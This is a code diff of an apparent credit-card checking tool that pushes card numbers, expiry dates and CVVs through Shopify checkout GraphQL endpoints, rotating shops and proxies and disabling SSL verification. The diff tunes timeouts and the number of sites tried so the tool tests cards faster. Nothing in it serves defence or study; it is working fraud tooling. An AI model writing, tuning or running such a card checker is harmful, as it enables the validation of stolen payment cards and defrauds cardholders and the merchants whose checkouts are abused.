@@ -225,7 +225,7 @@ def _parse_seller(seller):
 async def _negotiate(session, graphql_url, headers, variables):
     for attempt in range(3):
         try:
-            resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=12))
+            resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=8))
             data = await resp.json(content_type=None)
             negotiate = data.get('data', {}).get('session', {}).get('negotiate', {})
             if not negotiate or not isinstance(negotiate, dict):
@@ -435,7 +435,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
 
     async def _do_submit():
         try:
-            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=10))
+            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=8))
             return await r.text()
         except:
             return '{"error":"submit_timeout"}'
@@ -698,21 +698,21 @@ async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
     elif sites:
         cleaned = [s.replace("https://", "").replace("http://", "").rstrip("/") for s in sites if s]
         random.shuffle(cleaned)
-        sites_to_try = cleaned[:15]
+        sites_to_try = cleaned[:5]
     else:
         fallback = SHOPIFY_SITES.copy()
         random.shuffle(fallback)
-        sites_to_try = fallback[:10]
+        sites_to_try = fallback[:5]
 
     async def _try_sites(site_list, use_proxy):
         for s in site_list:
             logger.info(f"Checking {card_short} on {s} proxy={use_proxy is not None}")
             try:
-                kw = {"timeout": aiohttp.ClientTimeout(total=18), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
+                kw = {"timeout": aiohttp.ClientTimeout(total=10), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
                 if use_proxy:
                     kw["proxy"] = use_proxy
                 async with aiohttp.ClientSession(**kw) as session:
-                    result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=20)
+                    result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=12)
                     amount, response, gw_name = result[0], result[1], result[2]
                     extra = result[3] if len(result) > 3 else None
                     elapsed_now = round(time.time() - start, 2)
@@ -749,16 +749,16 @@ async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
     if sites_to_try and not requested_site:
         fallback = SHOPIFY_SITES.copy()
         random.shuffle(fallback)
-        fallback_clean = [s for s in fallback[:8] if s not in sites_to_try]
+        fallback_clean = [s for s in fallback[:3] if s not in sites_to_try]
         result = await _try_sites(fallback_clean, proxy_url)
         if result:
             return result
 
     if proxy_url:
         logger.info(f"All sites failed with proxy, retrying WITHOUT proxy...")
-        all_sites = sites_to_try + [s for s in SHOPIFY_SITES if s not in sites_to_try][:8]
+        all_sites = sites_to_try + [s for s in SHOPIFY_SITES if s not in sites_to_try][:3]
         random.shuffle(all_sites)
-        result = await _try_sites(all_sites[:15], None)
+        result = await _try_sites(all_sites[:5], None)
         if result:
             return result
 
